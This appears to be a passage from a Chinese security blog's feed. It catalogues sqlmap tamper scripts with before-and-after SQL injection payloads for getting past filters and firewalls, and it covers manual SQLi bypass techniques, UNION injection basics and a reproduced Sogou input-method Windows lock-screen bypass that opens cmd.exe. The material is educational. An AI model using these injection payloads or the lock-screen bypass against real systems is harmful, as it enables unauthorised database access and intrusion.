class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD%20FROM TABLE</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0053\u0045\u004c\u0045\u0043\u0054\u0020\u0046\u0049\u0045\u004c\u0044\u0025\u0032\u0030\u0046\u0052\u004f\u004d\u0020\u0054\u0041\u0042\u004c\u0045</span><br></pre></td></tr></table></figure><p>（18）space2comment.py</p><p>作用：将空格替换为“&#x2F;**&#x2F;”</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT/**/ID/**/FROM/**/users</span><br></pre></td></tr></table></figure><p>（19）equaltolike.py</p><p>作用：将等号（&#x3D;）替换为“like”</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id Like 1</span><br></pre></td></tr></table></figure><p>（20）greatest.py</p><p>作用：绕过对“大于号（&gt;）”的过滤，用“GREATEST”替换大于号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND GREATEST（A，B+1）=A</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#测试通过的数据库类型和版本如下</span><br><span class="line">MySQL4;MySQL5和MySQL5.5</span><br><span class="line">oracle 10g</span><br><span class="line">postgresql8.3;postgresql8.4和postgresql9.0</span><br></pre></td></tr></table></figure><p>（21）ifnull2ifisnull.py</p><p>作用：绕过对“IFNULL”的过滤，将类似“IFNULL(A,B)”的数据库语句替换为“IF(ISNULL(A),B,A)”</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(1,2)</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(ISNULL(1),2,1)</span><br></pre></td></tr></table></figure><p>（22）modsecurityversioned.py</p><p>作用：过滤空格，通过mysql内联注释的方式进行注入</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1--</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 /*!30874AND 2&gt;1*/--</span><br></pre></td></tr></table></figure><p>该脚本可在mysql5.0数据库中使用</p><p>（23）space2mysqlblank.py</p><p>作用：将空格替换为其他空白符号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%A0id%0BFROM%0Cusers</span><br></pre></td></tr></table></figure><p>该脚本可以在Mysql5.1数据库中使用</p><p>（24）modsecurityzeroversioned.py</p><p>作用：使用MySQL内联注释的方法进行注入</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1--</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 /*!00000AND 2&gt;1*/--</span><br></pre></td></tr></table></figure><p>该脚本可以在MySQL5.0数据库中使用</p><p>（25）space2mysqldash.py</p><p>作用：将空格替换为“–”，并添加一个换行符</p><p>使用脚本前语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227</span><br></pre></td></tr></table></figure><p>使用脚本后语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--%0AAND--%0A9227=9227</span><br></pre></td></tr></table></figure><p>（26）bluecoat.py</p><p>作用：在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users where id = 1</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%09id FROM%09users where%09id LIKE 1</span><br></pre></td></tr></table></figure><p>该脚本可以在MySQL5.1和SGOS数据库中使用</p><p>（27）versionedkeywords.py</p><p>作用绕过注释</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION ALL SELECT NULL,NULL,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CH/**/AR(58,100,114,117,58))#</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CH/**/AR(58,100,114,117,58))#</span><br></pre></td></tr></table></figure><p>（28）halfvesionedmorekeyword.py</p><p>作用：当数据库为mysql时，绕过防火墙，在每个关键字前添加MySQL版本注释</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value&#x27; UNION ALL SELECT CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)),NULL,NULL# AND &#x27;QDWa&#x27;=&#x27;QDWa</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value&#x27;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,104,116,116,58),/*!0IFNULL(CAST(CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;QDWa&#x27;=&#x27;QDWa</span><br></pre></td></tr></table></figure><p>该脚本可在MySQL4.018和MySQL5.022数据库中使用</p><p>（29）space2morehash.py</p><p>作用：将空格替换为井字号，并添加一个随机字符串和换行符</p><p>使用脚本前语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227</span><br></pre></td></tr></table></figure><p>使用脚本后语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%23ngNvzqu%0Aand%23nVNaVoPYeva%0A%23 lujYFWfv%0A9227=9227</span><br></pre></td></tr></table></figure><p>该脚本可在MySQL5.1.41数据库中使用</p><p>（30）apostrophenullencode.py</p><p>作用：用非法双字节unicode字符替换单引号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND %00%271%00%27=%00%271</span><br></pre></td></tr></table></figure><p>（31）appendnullbyte.py</p><p>作用：在有效符合的结束位置加载零字节字符编码</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1%00</span><br></pre></td></tr></table></figure><p>（32）chardoubleencode.py</p><p>作用：对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</span><br></pre></td></tr></table></figure><p>（33）unmagicquotes.py</p><p>作用：用一个多字节组合（%bf%27）和末尾通用注释一起替换空格。</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ AND 1=1</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%bf%27--</span><br></pre></td></tr></table></figure><p>（34）randomcomments.py</p><p>作用：用“&#x2F;**&#x2F;”分割SQL关键字</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN/**/S/**/ERT</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜狗输入法绕过windows锁屏复现</title>
      <link href="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="搜狗输入法绕过window锁屏复现"><a href="#搜狗输入法绕过window锁屏复现" class="headerlink" title="搜狗输入法绕过window锁屏复现"></a>搜狗输入法绕过window锁屏复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>window10环境（我这里使用的虚拟机环境）</p><p>搜狗输入法最新版</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>这个漏洞很早之前就存在，相关文章参考</p><p><a href="https://wooyun.xyz/bug_detail.php?wybug_id=wooyun-2015-0130018">https://wooyun.xyz/bug_detail.php?wybug_id=wooyun-2015-0130018</a></p><p>回到正题</p><p>在window10锁屏界面点击屏幕键盘，切换搜狗输入法，并将键盘拖动到输入法附近，使输入法的图标显示出来。</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141033893.png" class="" title="image-20240802141033893"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141051153.png" class="" title="image-20240802141051153"><p>之后打开菜单，点击游戏中心，之后没下载游戏中心的会下载，之后随便点一个跳转登录页面，我们点击qq手机版登录。</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141654592.png" class="" title="image-20240802141654592"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141716598.png" class="" title="image-20240802141716598"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141823532.png" class="" title="image-20240802141823532"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142031208.png" class="" title="image-20240802142031208"><p>之后我们会跳转到qq的下载页面，我们点击window下载，发现会弹出来下载位置的文件夹。</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142101700.png" class="" title="image-20240802142101700"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142325381.png" class="" title="image-20240802142325381"><p>之后我们去c盘：windows&#x2F;system32&#x2F;cmd.exe,那么我们就可以实现cmd拿取终端了。</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142634054.png" class="" title="image-20240802142634054"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142725833.png" class="" title="image-20240802142725833"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142823738.png" class="" title="image-20240802142823738"><p>那么引申一下；百度输入法》超会写》ai创作》设置》词库》导入阅读选项也可以打开文件夹完成以上操作，同样谷歌输入法也存在该漏洞。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该漏洞产生原因是微软屏幕键盘相关程序主动以特权接口加载第三方中文输入法导致</p><p>该漏洞于8月1日在微信群大量传播，8月2日复现时，搜狗输入法已通知微软相关安全团队，并采取了主动规避措施（在window登录界面下搜狗输入法将主动退出执行，且在界面上已无法看到游戏中心）</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802143317404.png" class="" title="image-20240802143317404"><p>文章参考：<a href="https://mp.weixin.qq.com/s/-jcJAkfK_DnQut6ou_dkkA">https://mp.weixin.qq.com/s/-jcJAkfK_DnQut6ou_dkkA</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入的绕过和修复建议</title>
      <link href="/2024/08/01/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
      <url>/2024/08/01/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入绕过技术"><a href="#sql注入绕过技术" class="headerlink" title="sql注入绕过技术"></a>sql注入绕过技术</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>当访问id&#x3D;1 and 1&#x3D;1时返回no back，尝试使用任意关键字大小写绕过，比如将and大写AND（任意字母大小写都可以aNd、And都行），如果id&#x3D;1 And 1&#x3D;1返回与id&#x3D;1相同结果，id&#x3D;2 And 1&#x3D;2返回与id&#x3D;1不同的结果，说明存在SQL注入。后续命令如果被拦截，都进行一定的大小写尝试绕过。</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果访问id&#x3D;1‘报错，后续访问id&#x3D;1’ and 1&#x3D;1也报错，且返回报错的信息只有“1&#x3D;1”没有and的话，说明and被过滤了，尝试大小写绕过，如果不成功，就尝试双写的方式绕过，比如anandd 1&#x3D;1，当anandd被过滤中间的and后，就只剩下了and，所以这时传入数据库中的语句是and 1&#x3D;1，后续思路大差不差，通过返回的报错信息来双写相关语句。</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>访问id&#x3D;1‘，发现报错，访问id&#x3D;1 and 1&#x3D;1和id&#x3D;1 and 1&#x3D;2时，发现关键字and被拦截，先使用大小写和双写的方法尝试绕过，不行的话，将关键词进行URL<strong>全编码</strong>（这里URL编码要编码两次，因为服务器会自动对url进行一次url解码）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#url编码和全编码的区别</span><br><span class="line"></span><br><span class="line">#url编码</span><br><span class="line">#定义</span><br><span class="line">URL编码将URL中的非ASCII字符和特殊字符转换为 % 符号后跟两位十六进制数字的形式。例如，空格会被编码为 %20，问号 ? 会被编码为 %3F。</span><br><span class="line"></span><br><span class="line">#示例</span><br><span class="line">如果URL被编码，例如 http://example.com/path?param=value 可能会变成 http://example.com/path?param%3Dvalue，其中非ASCII字符和特殊字符转换为 % 符号后跟两位十六进制数字的形式。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#url全编码</span><br><span class="line">#定义</span><br><span class="line">全编码是指将URL中的所有字符（包括协议，域名，路径和查询参数等）都进行URL编码处理。这种方式将整个URL的所有部分都转换为安全的ASCII字符形式。</span><br><span class="line"></span><br><span class="line">#示例</span><br><span class="line">如果整个URL都被全编码，例如 http://example.com/path?param=value 可能会变成 http%3A%2F%2Fexample.com%2Fpath%3Fparam%3Dvalue，其中所有字符都经过了URL编码处理。</span><br></pre></td></tr></table></figure><p>and进行两次url全编码后的结果是%25%36%31%25%36%45%25%36%34，所以如果访问id&#x3D;1 %25%36%31%25%36%45%25%36%34 1&#x3D;1返回与id&#x3D;1相同的结果，访问id&#x3D;1 %25%36%31%25%36%45%25%36%34 1&#x3D;2返回与id&#x3D;1不同的结果，说明该网址存在SQL注入漏洞。</p><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>访问id&#x3D;1‘，返回MySQL报错，接着访问and 1&#x3D;1和and 1&#x3D;2，发现存在关键字拦截，前三种方法都不行时，就尝试使用内联注释绕过，当我们访问以下内容时，页面返回与id&#x3D;1相同结果，(相关介绍请看前一篇内容mysql相关知识点章节)，后续看返回结果确定漏洞存在与否。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1 /*!and*/ 1=1</span><br><span class="line"></span><br><span class="line">id=1 /*!and*/ 1=2</span><br></pre></td></tr></table></figure><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>过滤危险字符</p><p>使用预编译语句</p>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入相关学习</title>
      <link href="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>前端向后端发送某些数据，后端在向数据库发送sql语句请求时，如果没有对相关参数进行严格过滤，则有可能会导致危险的SQL语句被输入数据库中进行查询，从而导致数据库被未授权增删改查。</p><h2 id="sql注入要素"><a href="#sql注入要素" class="headerlink" title="sql注入要素"></a>sql注入要素</h2><p>1.输入内容的位置没有做限制，用户可以自由控制输入的内容。（参数用户可控）</p><p>2.用户输入的内容可以被带入数据库中执行。（参数带入数据库查询）</p><p>以后端php语句为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id = $_GET[&#x27;id&#x27;]&quot;;</span><br></pre></td></tr></table></figure><p>那么这里的参数id就是可控的，我们可以任意拼接sql语句进行攻击。</p><p>当传入的ID参数为1’时，数据库执行的代码如下图所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1&#x27;</span><br></pre></td></tr></table></figure><p>这行sql语句不符合数据库语句规范，所以会产生报错。当传入的ID参数为1 and 1&#x3D;1时，执行的SQL语句如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and 1=1  #当为真时</span><br><span class="line">select * from users where id = 1 and 1=2  #当为假时</span><br></pre></td></tr></table></figure><p>因为1&#x3D;1为真，所以where语句中id&#x3D;1也为真所以会返回和id&#x3D;1相同的结果。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727114202322.png" class="" title="image-20240727114202322"><p>因为1&#x3D;2为假，所以where语句中id&#x3D;1也为假所以会返回和id&#x3D;1不同的结果。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727114217816.png" class="" title="image-20240727114217816"><p>这里放一个参考表</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727115824592.png" class="" title="image-20240727115824592"><h2 id="MySQL相关知识点"><a href="#MySQL相关知识点" class="headerlink" title="MySQL相关知识点"></a>MySQL相关知识点</h2><h3 id="库名、表名、字段名"><a href="#库名、表名、字段名" class="headerlink" title="库名、表名、字段名"></a>库名、表名、字段名</h3><p>MySQL5.0版本之后，会在数据库中默认存放一个<strong>information_schema</strong>的数据库，在这之中，有三个表名需要记住，分别是<strong>SCHEMATA</strong>、<strong>TABLES</strong>和<strong>COLUMNS</strong>。</p><h4 id="SCHEMATA"><a href="#SCHEMATA" class="headerlink" title="SCHEMATA"></a>SCHEMATA</h4><p><strong>SCHEMATA</strong>表储存用户创建的所有数据库的库名，我需要记住该表中记录数据库库名的字段名为<strong>SCHEMA_NAME（库名）</strong></p><h4 id="TABLES"><a href="#TABLES" class="headerlink" title="TABLES"></a>TABLES</h4><p><strong>TABLES</strong>表储存该用户创建的所有数据库的库名和表名，我们需要记住该表中记录数据库的库名和表名的字段名分别为<strong>TABLE_SCHEMA（库名）</strong>和<strong>TABLE_NAME（表名）</strong>。</p><h4 id="COLUMNS"><a href="#COLUMNS" class="headerlink" title="COLUMNS"></a>COLUMNS</h4><p><strong>COLUMNS</strong>表储存用户创建的所有库名、表名和字段名，我们需要记住其中的<strong>TABLE_SCHEMA（库名）</strong>、<strong>TABLE_NAME（表名）</strong>和<strong>COLUMN_NAME（字段名）</strong>。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727110242528.png" class="" title="image-20240727110242528"><h3 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h3><p>在不知道任何条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名</span><br></pre></td></tr></table></figure><p>在已知一条条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名 WHERE 已知条件的字段名=&#x27;已知条件的值&#x27;</span><br></pre></td></tr></table></figure><p>在已知两条条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名 WHERE 已知条件一的字段名=&#x27;已知条件一的值&#x27; AND 已知条件二的字段名=&#x27;已知条件二的值&#x27;</span><br></pre></td></tr></table></figure><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727105718625.png" class="" title="image-20240727105718625"><h3 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h3><p>limit的使用格式为limit m,n；其中m是记录开始的位置，从0开始记录，n是值取n条记录。例如limit 0,1是指从第一条记录开始，取一条记录。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727105920048.png" class="" title="image-20240727105920048"><h3 id="要记住的几个函数"><a href="#要记住的几个函数" class="headerlink" title="要记住的几个函数"></a>要记住的几个函数</h3><p>database（）：当前网站使用的数据库</p><p>version（）：当前mysql版本</p><p>user（）：当前mysql用户</p><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>mysql常见注释符表达方式：#或者–空格或者&#x2F;**&#x2F;。</p><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式:/*!code*/</span><br></pre></td></tr></table></figure><p>内联注释可以用于整个SQL语句中，用来执行sql语句，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</span><br></pre></td></tr></table></figure><p>内联注释可以用来写入语句中的某一位置来完成绕过。</p><hr><h2 id="联合注入-Union"><a href="#联合注入-Union" class="headerlink" title="联合注入(Union)"></a>联合注入(Union)</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>首先通过手注 1&#x2F;1’ 和 1 and 1&#x3D;1&#x2F;1 and 1&#x3D;2 判断是否存在SQL注入，如果&#x2F;左右两边的参数输入后两次的返回结果不一致，则说明存在sql注入。（这里建议使用bp的repeater查看返回包。）</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727120546402.png" class="" title="image-20240727120546402"><p>之后使用order by 1-99语句查询该数据表的字段行数，例如，如果访问id&#x3D;1 order by 3，页面返回与id&#x3D;1相同的结果，则说明有第三行，如果访问id&#x3D;1 order by 